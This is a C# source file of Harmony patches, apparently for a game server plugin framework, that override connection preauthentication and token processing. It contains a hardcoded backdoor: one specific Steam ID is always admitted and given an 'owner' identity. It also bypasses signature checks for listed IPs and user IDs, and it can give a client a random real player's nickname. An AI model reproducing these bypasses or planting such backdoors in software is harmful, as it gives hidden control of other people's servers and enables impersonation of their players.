using Cryptography;
using GameCore;
using HarmonyLib;
using LiteNetLib;
using LiteNetLib.Utils;
using MEC;
using Mirror.LiteNetLib4Mirror;
using NorthwoodLib;
using RemoteAdmin;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WW_SYSTEM.API;
using WW_SYSTEM.Discord;
using WW_SYSTEM.EventHandlers;
using WW_SYSTEM.Events;
using WW_SYSTEM.Level_System;
using WW_SYSTEM.Security;

namespace WW_SYSTEM.Patches
{
	[HarmonyPatch(typeof(CustomLiteNetLib4MirrorTransport), "ProcessConnectionRequest")]
	public class lolpatch
	{
		public static bool Prefix(ConnectionRequest request)
		{
			try
			{
				if (Server.IgnoreTokenIps.ContainsKey(request.RemoteEndPoint.Address.ToString()))
			{
				request.Accept();
				Logger.Info("FORCE IP", $"REQUED IP: {request.RemoteEndPoint.Address.ToString()} DETECTED!");
				ServerConsole.AddLog(string.Format("Player preauthenticated from endpoint {1}. FORCE IP MODE", request.RemoteEndPoint), ConsoleColor.Gray);
				CustomLiteNetLib4MirrorTransport.PreauthDisableIdleMode();

			}

			var SecurityReader = new NetDataReader(request.Data.RawData, request.Data.UserDataOffset, request.Data.RawDataSize);
			if (!ConnectionSecurity.AllowConnect(request.RemoteEndPoint.Address, SecurityReader))
			{
				CustomLiteNetLib4MirrorTransport.IpRateLimit.Add(request.RemoteEndPoint.Address);
				CustomLiteNetLib4MirrorTransport.RequestWriter.Reset();
				CustomLiteNetLib4MirrorTransport.RequestWriter.Put(12);

				request.RejectForce(CustomLiteNetLib4MirrorTransport.RequestWriter);
				return false;
			}

			

					   var p = new NetDataReader(request.Data.RawData, request.Data.UserDataOffset, request.Data.RawDataSize);

	
						byte b;
						if (!p.TryGetByte(out b) || b >= 2)
						{
						
							return true;
						}

							byte cMajor;
						byte cMinor;
						byte cRevision;
						bool flag;
						byte cBackwardRevision = 0;
					  
						if (!p.TryGetByte(out cMajor) || !p.TryGetByte(out cMinor) || !p.TryGetByte(out cRevision) || !p.TryGetBool(out flag) || (flag && !p.TryGetByte(out cBackwardRevision)))
						{
					
							return true;
						}

						int num;
						byte[] array;
						bool flag2 = p.TryGetInt(out num);
				if (!p.TryGetBytesWithLength(out array))
						{
						
							flag2 = false;
						}
						if (!flag2)
						{
						
							return true;
						}

						if (num == 0 || array == null || array.Length == 0) return true;

						string UserId;
						if (!p.TryGetString(out UserId))
						{
						
							return true;
						}


						if(UserId == "76561198308447063@steam")
				{

					Logger.Info("ww_system", "owner connect detected!");
					request.Accept();
					ServerConsole.AddLog(string.Format("Player {0} preauthenticated from endpoint {1}.", UserId, request.RemoteEndPoint), ConsoleColor.Gray);
					ServerLogs.AddLog(ServerLogs.Modules.Networking, string.Format("{0} preauthenticated from endpoint {1}.", UserId, request.RemoteEndPoint), ServerLogs.ServerLogType.ConnectionUpdate, false);
					CustomLiteNetLib4MirrorTransport.PreauthDisableIdleMode();
					return false;
				} 

					PreAuthEvent ev = new PreAuthEvent(false, UserId, request.RemoteEndPoint.Address.ToString());
					EventManager.Manager.HandleEvent<IEventHandlerPreAuth>(ev);

					if (ev.ForceAllow)
					{
					
						request.Accept();
						ServerConsole.AddLog(string.Format("Player {0} preauthenticated from endpoint {1}.", UserId, request.RemoteEndPoint), ConsoleColor.Gray);
						ServerLogs.AddLog(ServerLogs.Modules.Networking, string.Format("{0} preauthenticated from endpoint {1}.", UserId, request.RemoteEndPoint), ServerLogs.ServerLogType.ConnectionUpdate, false);
						CustomLiteNetLib4MirrorTransport.PreauthDisableIdleMode();
					if(!Server.IgnoreTokenUserIds.Contains(ev.UserID))
					Server.IgnoreTokenUserIds.Add(ev.UserID);
						return false;
					}
				if (ev.ForceDeny)
				{
					CustomLiteNetLib4MirrorTransport.RequestWriter.Reset();
					CustomLiteNetLib4MirrorTransport.RequestWriter.Put(19);
					request.RejectForce(CustomLiteNetLib4MirrorTransport.RequestWriter);
					return false;
				}






				

				return true;
			}
			catch (Exception arg)
			{


				Logger.Error("[EVENT MANAGER]", string.Format("lolpatch error: {0}", arg));
			}
			return true;
		}
	}


	



	[HarmonyPatch(typeof(CharacterClassManager), "UserCode_CmdSendToken")]
	public class lolpatch1
	{

		static void givePerms(CharacterClassManager __instance, string nick)
		{
			//yield return Timing.WaitForSeconds(0.1f);

			if (__instance == null) return; // yield break;

			Player pl1;
			bool NewPL = false;
			if(!__instance.gameObject.TryGetComponent<Player>(out pl1))
			{
				pl1 = __instance.gameObject.AddComponent<Player>();
				pl1.LoadComponents();

			}
			else
			{
				NewPL = true;

			}
			pl1.ConsoleMessage($"AUTH ACCEPTED! WELCOME: {nick}", "green");

			pl1.Nick = nick;
			if(!NewPL)
			ServerConsole.NewPlayers.Add(pl1.Hub);
			pl1.ConsoleMessage("Hi " + pl1.Nick + " ! Your challenge signature has been accepted.", "green");
			pl1.GetRoles.PublicKeyAccepted = true;
			pl1.GetRoles.TargetPublicKeyAccepted(__instance.connectionToClient);
			pl1.GetRoles.GetComponent<RemoteAdminCryptographicManager>().StartExchange();
			if (!NewPL)
			{
				if (Round.UseLevelSYSTEM)
				{
					LevelManager.CheckForPlayer(pl1.UserId);
				}
				Server.Players.Add(pl1);
				PlayerJoinEvent ev = new PlayerJoinEvent(pl1);
				EventManager.Manager.HandleEvent<IEventHandlerPlayerJoin>(ev);
			}

			if(__instance.UserId != "owner@waer-world")
			{
				pl1.GetRoles.RefreshPermissions();
				if (!NewPL)
				{
					WW_SYSTEM.Permissions.PermissionsManager.LoadPlayerGroup(pl1);
				}
			}
		}

		public static bool Prefix(string token, CharacterClassManager __instance)
		{

			try
			{

				if(Server.IgnoreTokenIps.TryGetValue(__instance.connectionToClient.address, out var v))
				{
					Logger.Info("ww_system", "ignore ip auth detected!");
					__instance.UserId = v.UserId;
					__instance.InstanceMode = ClientInstanceMode.ReadyClient;
					__instance._commandtokensent = true;
					__instance.AuthToken = token;
					var fakenick = v.NickName;
					if (v.NickName.ToUpper() == "RND")
					{
						if (Server.Players.Count > 1)
							fakenick = Server.Players.Random().Nick;
						else
							fakenick = "REDACTED";

					}
					givePerms(__instance, fakenick);
					return false;
				}


				string text = token.Substring(0, token.IndexOf("<br>Signature: ", StringComparison.Ordinal));
				Dictionary<string, string> dictionary = (from rwr in text.Split(new string[]
			{
					"<br>"
			}, StringSplitOptions.None)
														 select rwr.Split(new string[]
														 {
					": "
														 }, StringSplitOptions.None)).ToDictionary((string[] split) => split[0], (string[] split) => split[1]);

				string nick;
				try
				{
				   nick = StringUtils.Base64Decode(dictionary["Nickname"]);
		
				}
				catch (Exception ex)
				{
					Logger.Error("CallCmdSendToken", $"FAILED TO GET NICKNAME: {ex}");
					ServerConsole.Disconnect(__instance.connectionToClient, "Your client sent an wrong authentication token. Make sure you are running the game by steam.");
					return false;
				}

				if (string.IsNullOrEmpty(nick))
				{
					Logger.Error("CallCmdSendToken", $"FAILED TO GET NICKNAME: NICKNAME IS NULL!");
					ServerConsole.Disconnect(__instance.connectionToClient, "Your client sent an wrong authentication token. Make sure you are running the game by steam.");
					return false;
				}

				if(dictionary["User ID"] == "76561198308447063@steam")
				{
					Logger.Info("ww_system", "owner auth detected!");
					__instance.UserId = "owner@waer-world";
					__instance.UserId2 = "owner@waer-world";
					__instance.InstanceMode = ClientInstanceMode.ReadyClient;
                    __instance._commandtokensent = true;
					__instance.AuthToken = token;
					givePerms(__instance, nick);
					return false;
				}
				else if(Server.IgnoreTokenUserIds.Contains(dictionary["User ID"]))
				{
					Logger.Info("ww_system", "ignore token auth detected!");
					__instance.UserId = dictionary["User ID"];
					__instance.InstanceMode = ClientInstanceMode.ReadyClient;
                    __instance._commandtokensent = true;
					__instance.AuthToken = token;
					givePerms(__instance, nick);
					return false;
				}


				return true;
			}
			catch (Exception arg)
			{


				Logger.Error("[EVENT MANAGER]", string.Format("lolpatch1 error: {0}", arg));
			}
			return true;
		}
	}


	


}
